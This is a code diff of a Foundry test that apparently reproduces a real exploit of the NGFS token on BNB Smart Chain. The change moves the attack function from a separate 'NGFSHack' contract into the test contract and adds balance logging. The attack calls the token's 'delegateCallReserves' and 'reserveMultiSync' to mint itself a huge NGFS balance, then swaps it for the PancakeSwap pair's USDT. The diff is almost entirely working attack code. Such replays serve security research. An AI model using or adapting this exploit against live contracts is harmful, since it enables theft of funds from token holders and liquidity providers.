@@ -20,7 +20,27 @@ INgfs constant NGFS = INgfs(
 
 IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
-contract NGFSHack {
+contract NGFSTest is Test {
+    function setUp() public {
+        vm.createSelectFork("bsc", 38167373 - 1);
+    }
+
+    function testExploit() public {
+        emit log_named_decimal_uint(
+            "USDT balance",
+            USDT.balanceOf(address(this)),
+            USDT.decimals()
+        );
+
+        fuckyou();
+
+        emit log_named_decimal_uint(
+            "USDT balance",
+            USDT.balanceOf(address(this)),
+            USDT.decimals()
+        );
+    }
+
     function fuckyou() public {
         address pair = PancakeFactoryV2.getPair(address(NGFS), address(USDT));
         NGFS.delegateCallReserves();
@@ -28,6 +48,17 @@ contract NGFSHack {
 
         uint256 syncAmount = NGFS.balanceOf(pair);
         NGFS.reserveMultiSync(address(this), syncAmount * 100);
+
+        emit log_named_decimal_uint(
+            "NGFS balance",
+            NGFS.balanceOf(address(this)),
+            NGFS.decimals()
+        );
+        emit log_named_decimal_uint(
+            "NGFS pair USDT",
+            USDT.balanceOf(pair),
+            USDT.decimals()
+        );
 
         address[] memory path = new address[](2);
         path[0] = address(NGFS);
@@ -39,29 +70,6 @@ contract NGFSHack {
             path,
             address(this),
             block.timestamp + 1
-        );
-    }
-}
-
-contract NGFSTest is Test {
-    function setUp() public {
-        vm.createSelectFork("bsc", 38167373 - 1);
-    }
-
-    function testExploit() public {
-        NGFSHack hacker = new NGFSHack();
-        emit log_named_decimal_uint(
-            "USDT balance",
-            USDT.balanceOf(address(hacker)),
-            USDT.decimals()
-        );
-
-        hacker.fuckyou();
-
-        emit log_named_decimal_uint(
-            "USDT balance",
-            USDT.balanceOf(address(hacker)),
-            USDT.decimals()
         );
     }
 }
